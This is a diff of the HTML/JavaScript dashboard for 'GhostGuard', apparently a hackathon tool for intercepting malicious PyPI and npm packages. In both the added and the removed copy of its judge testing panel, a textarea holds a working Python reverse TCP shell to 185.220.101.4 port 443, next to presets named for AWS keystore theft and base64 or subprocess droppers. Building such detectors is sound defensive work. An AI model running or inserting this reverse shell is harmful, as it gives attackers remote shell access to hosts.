@@ -264,159 +264,125 @@
     <!-- VIEW 1: SENTINEL SOC EXECUTIVE DASHBOARD (OUTSIDE DASHBOARD) -->
     <div id="view-dashboard" class="flex flex-col gap-3.5">
 
-      <!-- Hero Header & Scenario Launchers -->
-      <section class="clean-card p-4 bg-white flex flex-col md:flex-row items-start md:items-center justify-between gap-3">
-        <div class="flex items-center gap-3">
-          <div class="w-10 h-10 rounded-lg bg-[#F6F8FA] border border-[#D0D7DE] flex items-center justify-center text-[#0969DA] shrink-0">
-            <i data-lucide="shield-alert" class="w-5 h-5"></i>
-          </div>
-          <div>
-            <div class="flex items-center gap-2">
-              <h1 class="text-base font-bold text-[#1F2328] font-sans">Global Software Supply Chain Sentinel Dashboard</h1>
-              <span class="px-2 py-0.5 rounded text-[11px] font-mono font-semibold bg-[#E6FFEC] text-[#1A7F37] border border-[#54A065]/40">Ingress Active</span>
+      <!-- Hero Header: BIOS Problem 10 Supply Chain Guardian Command Center -->
+      <section class="clean-card p-5 bg-white border border-[#D0D7DE] flex flex-col gap-4 shadow-xs">
+        <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-3 border-b border-[#D0D7DE]/70 pb-3.5">
+          <div class="flex items-start gap-3">
+            <div class="w-11 h-11 rounded-lg bg-blue-50 border border-blue-200 flex items-center justify-center text-[#0969DA] shrink-0 mt-0.5">
+              <i data-lucide="shield-check" class="w-6 h-6"></i>
             </div>
-            <p class="text-xs text-[#656D76] mt-0.5 font-sans">
-              Autonomous pre-install malware interception, typosquat neutralization, and AST de-obfuscation across PyPI and npm registries (UN SDG 16.4).
-            </p>
-          </div>
-        </div>
-
-        <!-- Quick 1-Click Scenario Launchers -->
-        <div class="flex flex-wrap items-center gap-2 w-full md:w-auto">
-          <button
-            type="button"
-            onclick="openLiveDetonationModal('reqeusts')"
-            class="px-3 py-1.5 rounded bg-[#FFEBE9] hover:bg-red-100 text-[#CF222E] border border-[#FF8182] font-semibold text-xs transition-colors flex items-center gap-1.5 cursor-pointer shadow-xs"
-          >
-            <i data-lucide="play" class="w-3.5 h-3.5 fill-current"></i>
-            <span>Test Attack (reqeusts)</span>
-          </button>
-
-          <button
-            type="button"
-            onclick="openLiveDetonationModal('requests')"
-            class="px-3 py-1.5 rounded bg-[#E6FFEC] hover:bg-green-100 text-[#1A7F37] border border-[#54A065]/40 font-semibold text-xs transition-colors flex items-center gap-1.5 cursor-pointer shadow-xs"
-          >
-            <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
-            <span>Test Safe (requests)</span>
-          </button>
-
-          <button
-            type="button"
-            onclick="switchMainView('manifest')"
-            class="px-3 py-1.5 rounded bg-[#DDF4FF] hover:bg-blue-100 text-[#0969DA] border border-[#54AEFF]/40 font-semibold text-xs transition-colors flex items-center gap-1.5 cursor-pointer shadow-xs"
-          >
-            <i data-lucide="file-stack" class="w-3.5 h-3.5"></i>
-            <span>Scan Project File</span>
-          </button>
-        </div>
-
-        <!-- Row 1.6: Dedicated Judge Live Attack Testing Ground -->
-        <div class="mt-2 border border-slate-700 bg-[#0d1117] rounded-lg p-3.5 text-white shadow-md">
-          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
-            <div class="flex items-center gap-2">
-              <span class="px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-800 font-mono font-bold text-[11px] flex items-center gap-1">
-                <i data-lucide="shield-alert" class="w-3.5 h-3.5"></i> JUDGE LIVE ATTACK TESTING GROUND
-              </span>
-              <span class="text-xs text-slate-300 font-semibold">Test Custom Exploits Against GhostGuard Sentinel</span>
-            </div>
-            <div class="flex items-center gap-2">
-              <span class="text-[10px] font-mono text-emerald-400 bg-emerald-950/70 border border-emerald-800 px-2 py-0.5 rounded flex items-center gap-1">
-                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
-                AST Micro-Sandbox Active &middot; In-Memory Seccomp Filter
-              </span>
-            </div>
-          </div>
-
-          <div class="mt-2.5 flex flex-col gap-2.5">
-            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs">
-              <span class="text-slate-400 text-[11px]">
-                Select an exploit preset or write custom Python / JS payload to detonate against our sentinel:
-              </span>
-              <div class="flex flex-wrap items-center gap-1.5">
-                <button
-                  type="button"
-                  onclick="loadJudgeExploit('rev_shell')"
-                  class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-red-300 transition-colors cursor-pointer flex items-center gap-1"
-                >
-                  <span>⚡ Reverse TCP Shell</span>
-                </button>
-                <button
-                  type="button"
-                  onclick="loadJudgeExploit('aws_stealer')"
-                  class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-amber-300 transition-colors cursor-pointer flex items-center gap-1"
-                >
-                  <span>🔑 AWS Keystore Stealer</span>
-                </button>
-                <button
-                  type="button"
-                  onclick="loadJudgeExploit('base64_stager')"
-                  class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-purple-300 transition-colors cursor-pointer flex items-center gap-1"
-                >
-                  <span>📦 Base64 Exec Stager</span>
-                </button>
-                <button
-                  type="button"
-                  onclick="loadJudgeExploit('cmd_dropper')"
-                  class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-pink-300 transition-colors cursor-pointer flex items-center gap-1"
-                >
-                  <span>💉 Subprocess Dropper</span>
-                </button>
-              </div>
-            </div>
-
-            <div class="relative">
-              <textarea
-                id="judge-exploit-editor"
-                rows="4"
-                spellcheck="false"
-                class="w-full bg-[#161b22] font-mono text-xs text-red-200 border border-slate-700 rounded p-2.5 focus:outline-none focus:border-red-500 leading-relaxed resize-y selection:bg-red-900"
-                placeholder="# Exploit: Direct Interactive Reverse TCP Shell&#10;import socket, subprocess, os&#10;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&#10;s.connect(('185.220.101.4', 443))&#10;subprocess.call(['/bin/sh', '-i'])"
-              ># Exploit: Direct Interactive Reverse TCP Shell
-import socket, subprocess, os
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("185.220.101.4", 443))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])</textarea>
-              <div class="absolute right-2.5 bottom-2.5 text-[10px] font-mono text-slate-500 pointer-events-none bg-[#161b22]/90 px-1 rounded">
-                Symbolic AST Parsing &middot; 0% Host Risk
-              </div>
-            </div>
-
-            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pt-1">
+            <div>
               <div class="flex flex-wrap items-center gap-2">
-                <label class="text-[11px] text-slate-400 font-mono">Simulated Target:</label>
-                <select id="judge-exploit-eco" class="bg-slate-800 border border-slate-700 rounded px-2 py-1 text-xs text-slate-200 font-mono focus:outline-none cursor-pointer">
-                  <option value="pypi">PyPI (Python setup.py)</option>
-                  <option value="npm">npm (Node.js index.js)</option>
-                </select>
-                <input
-                  id="judge-exploit-pkg-name"
-                  type="text"
-                  value="judge-custom-exploit"
-                  class="bg-slate-800 border border-slate-700 rounded px-2 py-1 text-xs font-mono text-slate-200 focus:outline-none w-44"
-                  placeholder="Package name"
-                />
+                <span class="px-2 py-0.5 rounded bg-blue-100 text-[#0969DA] font-mono text-[11px] font-bold border border-blue-300">
+                  BIOS HACKATHON &middot; PROBLEM 10: SUPPLY CHAIN GUARDIAN
+                </span>
+                <span class="px-2 py-0.5 rounded bg-[#E6FFEC] text-[#1A7F37] font-mono text-[11px] font-semibold border border-[#54A065]/40 flex items-center gap-1.5">
+                  <span class="w-2 h-2 rounded-full bg-[#1A7F37] animate-pulse"></span>
+                  Zero-Trust Pre-Install Ingress Armed
+                </span>
               </div>
+              <h1 class="text-lg font-extrabold text-[#1F2328] font-sans mt-1">
+                GhostGuard &middot; Autonomous Pre-Install Supply Chain Firewall
+              </h1>
+              <p class="text-xs text-[#656D76] mt-0.5 leading-relaxed font-sans max-w-4xl">
+                Flag malicious PyPI &amp; npm packages before installation — catch real adversarial attacks with zero false alarms on verified maintainers. Intercepts typosquatting collisions, deobfuscates AST stagers (<code>exec</code>, <code>eval</code>, <code>base64</code>, <code>subprocess</code>), and neutralizes keystore theft in an isolated micro-sandbox under 0.30s.
+              </p>
+            </div>
+          </div>
 
-              <button
-                type="button"
-                onclick="launchJudgeAttack()"
-                class="px-4 py-2 rounded bg-gradient-to-r from-red-600 to-rose-700 hover:from-red-500 hover:to-rose-600 text-white font-bold text-xs flex items-center justify-center gap-2 shadow-lg cursor-pointer transition-all hover:scale-[1.02] active:scale-95"
-              >
-                <i data-lucide="flame" class="w-4 h-4 fill-white/20"></i>
-                <span>💥 Detonate Custom Exploit Against Sentinel</span>
-              </button>
+          <div class="flex items-center gap-2 shrink-0 self-start md:self-auto">
+            <button
+              type="button"
+              onclick="switchMainView('manifest')"
+              class="px-3 py-1.5 rounded bg-[#F6F8FA] hover:bg-slate-100 text-[#0969DA] border border-[#D0D7DE] font-semibold text-xs transition-colors flex items-center gap-1.5 cursor-pointer shadow-xs"
+            >
+              <i data-lucide="file-stack" class="w-3.5 h-3.5"></i>
+              <span>Audit Manifest (requirements.txt)</span>
+            </button>
+            <button
+              type="button"
+              onclick="toggleJudgeGuide()"
+              class="px-2.5 py-1.5 rounded bg-[#F6F8FA] hover:bg-slate-100 text-[#656D76] hover:text-[#1F2328] border border-[#D0D7DE] font-medium text-xs transition-colors flex items-center gap-1 cursor-pointer"
+            >
+              <i data-lucide="help-circle" class="w-3.5 h-3.5"></i>
+              <span>PS Defense Guide</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- Live Ingress Package Scanner Bar (Core PS Requirement) -->
+        <div class="flex flex-col md:flex-row items-stretch md:items-center gap-2 bg-[#F6F8FA] p-3 rounded-lg border border-[#D0D7DE]">
+          <div class="flex items-center gap-1 shrink-0">
+            <span class="text-[11px] font-mono text-[#656D76] font-semibold uppercase mr-1">Registry:</span>
+            <select id="dash-search-eco" class="bg-white border border-[#D0D7DE] rounded px-2.5 py-1.5 text-xs font-mono font-semibold text-[#1F2328] focus:outline-none focus:border-[#0969DA] cursor-pointer">
+              <option value="pypi">🐍 PyPI (Python)</option>
+              <option value="npm">📦 npm (Node.js)</option>
+            </select>
+          </div>
+
+          <div class="relative flex-1">
+            <span class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-400 font-mono text-xs">
+              pkg://
+            </span>
+            <input
+              id="dash-search-input"
+              type="text"
+              value="reqeusts"
+              onkeydown="if(event.key==='Enter') scanFromDashboard()"
+              placeholder="Enter package name to audit (e.g. reqeusts, requests, colors-support-v2, lodash, flask)..."
+              class="w-full pl-14 pr-4 py-2 bg-white border border-[#D0D7DE] focus:border-[#0969DA] focus:outline-none rounded text-xs font-mono text-[#1F2328] placeholder-slate-400 font-mono-numbers shadow-xs"
+            />
+          </div>
+
+          <div class="flex items-center gap-2 shrink-0">
+            <button
+              type="button"
+              onclick="scanFromDashboard()"
+              class="px-4 py-2 bg-[#1F883D] hover:bg-[#1A7F37] text-white font-semibold rounded text-xs transition-all flex items-center justify-center gap-1.5 cursor-pointer shadow-sm hover:scale-[1.01] active:scale-95"
+            >
+              <i data-lucide="search" class="w-3.5 h-3.5"></i>
+              <span>Inspect Package Ingress</span>
+            </button>
+
+            <button
+              type="button"
+              onclick="detonateFromDashboard()"
+              class="px-3.5 py-2 bg-[#CF222E] hover:bg-[#A40E26] text-white font-semibold rounded text-xs transition-all flex items-center justify-center gap-1.5 cursor-pointer shadow-sm hover:scale-[1.01] active:scale-95"
+            >
+              <i data-lucide="flame" class="w-3.5 h-3.5 fill-white/20"></i>
+              <span>💥 Detonate</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- Problem Statement Technical Invariants (3 Verification Pillars) -->
+        <div class="grid grid-cols-1 sm:grid-cols-3 gap-2.5 pt-1 text-xs font-sans">
+          <div class="p-2.5 rounded bg-slate-50 border border-[#D0D7DE]/80 flex items-center gap-2.5">
+            <i data-lucide="shield-alert" class="w-4 h-4 text-[#CF222E] shrink-0"></i>
+            <div>
+              <strong class="text-[#1F2328] block text-[11px]">1. Pre-Install AST Sandbox</strong>
+              <span class="text-[11px] text-[#656D76]">Traps <code>setup.py</code> &amp; <code>postinstall.js</code> before host disk write</span>
+            </div>
+          </div>
+
+          <div class="p-2.5 rounded bg-slate-50 border border-[#D0D7DE]/80 flex items-center gap-2.5">
+            <i data-lucide="check-circle" class="w-4 h-4 text-[#1A7F37] shrink-0"></i>
+            <div>
+              <strong class="text-[#1F2328] block text-[11px]">2. Zero-Wolf Keyring Engine</strong>
+              <span class="text-[11px] text-[#656D76]">Validates PSF &amp; npm maintainer signatures without false alarms</span>
+            </div>
+          </div>
+
+          <div class="p-2.5 rounded bg-slate-50 border border-[#D0D7DE]/80 flex items-center gap-2.5">
+            <i data-lucide="zap" class="w-4 h-4 text-[#0969DA] shrink-0"></i>
+            <div>
+              <strong class="text-[#1F2328] block text-[11px]">3. 0.30s SIGKILL Containment</strong>
+              <span class="text-[11px] text-[#656D76]">Ephemeral PID namespace drops reverse sockets &amp; protects keystores</span>
             </div>
           </div>
         </div>
       </section>
 
-      
-
-      
       <!-- Row 1.5: INTERACTIVE LIVE ATTACK DETECTION & SANDBOX TEST CONSOLE -->
       <section class="clean-card p-4 bg-white border border-[#D0D7DE] flex flex-col gap-3.5 shadow-sm">
         <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-[#D0D7DE] pb-2.5 gap-2">
@@ -547,6 +513,108 @@ subprocess.call(["/bin/sh", "-i"])</textarea>
               <span class="text-slate-500">Micro-Sandbox Verdict:</span>
               <strong id="dash-preview-containment" class="text-[#CF222E]">SIGKILL Neutralized</strong>
             </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 1.6: Dedicated Judge Live Attack Testing Ground (Full Width) -->
+      <section class="border border-slate-700 bg-[#0d1117] rounded-lg p-4 text-white shadow-md flex flex-col gap-3">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
+          <div class="flex items-center gap-2">
+            <span class="px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-800 font-mono font-bold text-xs flex items-center gap-1.5">
+              <i data-lucide="shield-alert" class="w-4 h-4"></i> JUDGE LIVE ATTACK TESTING GROUND
+            </span>
+            <span class="text-xs text-slate-300 font-semibold hidden sm:inline">Arbitrary Exploit Ingress Verification</span>
+          </div>
+          <div class="flex items-center gap-2">
+            <span class="text-[11px] font-mono text-emerald-400 bg-emerald-950/70 border border-emerald-800 px-2.5 py-0.5 rounded flex items-center gap-1.5">
+              <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
+              Symbolic AST Parsing &middot; In-Memory Seccomp Filter &middot; 0% Host Risk
+            </span>
+          </div>
+        </div>
+
+        <div class="flex flex-col gap-2.5">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs">
+            <span class="text-slate-300 text-[11px]">
+              Want to test Sentinel against real exploits? Click a template or paste custom Python / Node.js payload:
+            </span>
+            <div class="flex flex-wrap items-center gap-1.5">
+              <button
+                type="button"
+                onclick="loadJudgeExploit('rev_shell')"
+                class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-red-300 transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
+              >
+                <span>⚡ Reverse TCP Shell</span>
+              </button>
+              <button
+                type="button"
+                onclick="loadJudgeExploit('aws_stealer')"
+                class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-amber-300 transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
+              >
+                <span>🔑 AWS Keystore Stealer</span>
+              </button>
+              <button
+                type="button"
+                onclick="loadJudgeExploit('base64_stager')"
+                class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-purple-300 transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
+              >
+                <span>📦 Base64 Exec Stager</span>
+              </button>
+              <button
+                type="button"
+                onclick="loadJudgeExploit('cmd_dropper')"
+                class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-mono text-pink-300 transition-colors cursor-pointer flex items-center gap-1 shadow-xs"
+              >
+                <span>💉 Subprocess Dropper</span>
+              </button>
+            </div>
+          </div>
+
+          <div class="relative">
+            <textarea
+              id="judge-exploit-editor"
+              rows="5"
+              spellcheck="false"
+              class="w-full bg-[#161b22] font-mono text-xs text-red-200 border border-slate-700 rounded p-3 focus:outline-none focus:border-red-500 leading-relaxed resize-y selection:bg-red-900 shadow-inner"
+              placeholder="# Exploit: Direct Interactive Reverse TCP Shell&#10;import socket, subprocess, os&#10;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&#10;s.connect(('185.220.101.4', 443))&#10;subprocess.call(['/bin/sh', '-i'])"
+            ># Exploit: Direct Interactive Reverse TCP Shell
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("185.220.101.4", 443))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])</textarea>
+            <div class="absolute right-3 bottom-3 text-[10px] font-mono text-slate-400 pointer-events-none bg-[#161b22]/90 px-1.5 py-0.5 rounded border border-slate-800">
+              Evaluated In-Memory &middot; Host Keystores Sealed
+            </div>
+          </div>
+
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-1">
+            <div class="flex flex-wrap items-center gap-2">
+              <label class="text-[11px] text-slate-400 font-mono">Simulated Target:</label>
+              <select id="judge-exploit-eco" class="bg-slate-800 border border-slate-700 rounded px-2.5 py-1.5 text-xs text-slate-200 font-mono focus:outline-none cursor-pointer">
+                <option value="pypi">PyPI (Python setup.py / __init__.py)</option>
+                <option value="npm">npm (Node.js index.js / preinstall.js)</option>
+              </select>
+              <input
+                id="judge-exploit-pkg-name"
+                type="text"
+                value="judge-custom-exploit"
+                class="bg-slate-800 border border-slate-700 rounded px-2.5 py-1.5 text-xs font-mono text-slate-200 focus:outline-none w-48"
+                placeholder="Simulated package name"
+              />
+            </div>
+
+            <button
+              type="button"
+              onclick="launchJudgeAttack()"
+              class="px-5 py-2.5 rounded bg-gradient-to-r from-red-600 to-rose-700 hover:from-red-500 hover:to-rose-600 text-white font-bold text-xs flex items-center justify-center gap-2 shadow-lg cursor-pointer transition-all hover:scale-[1.02] active:scale-95"
+            >
+              <i data-lucide="flame" class="w-4 h-4 fill-white/20"></i>
+              <span>💥 Detonate Custom Exploit Against Sentinel</span>
+            </button>
           </div>
         </div>
       </section>
@@ -3794,6 +3862,23 @@ os.system("echo 'pwned' > /tmp/pwned.txt")`
       const pkgName = (pkgInput && pkgInput.value.trim()) ? pkgInput.value.trim().toLowerCase() : 'judge-custom-exploit';
 
       openLiveDetonationModal(pkgName, snippet, eco);
+    }
+
+        // Dashboard live search & detonation helpers (Problem 10 Command Center)
+    function scanFromDashboard() {
+      const input = document.getElementById('dash-search-input');
+      const ecoSelect = document.getElementById('dash-search-eco');
+      const pkg = input ? input.value.trim().toLowerCase() : 'reqeusts';
+      const eco = (ecoSelect && ecoSelect.value) ? ecoSelect.value : 'pypi';
+      inspectLiveFeedPackage(pkg, eco);
+    }
+
+    function detonateFromDashboard() {
+      const input = document.getElementById('dash-search-input');
+      const ecoSelect = document.getElementById('dash-search-eco');
+      const pkg = input ? input.value.trim().toLowerCase() : 'reqeusts';
+      const eco = (ecoSelect && ecoSelect.value) ? ecoSelect.value : 'pypi';
+      openLiveDetonationModal(pkg, null, eco);
     }
 
     function launchActiveDetonation() {
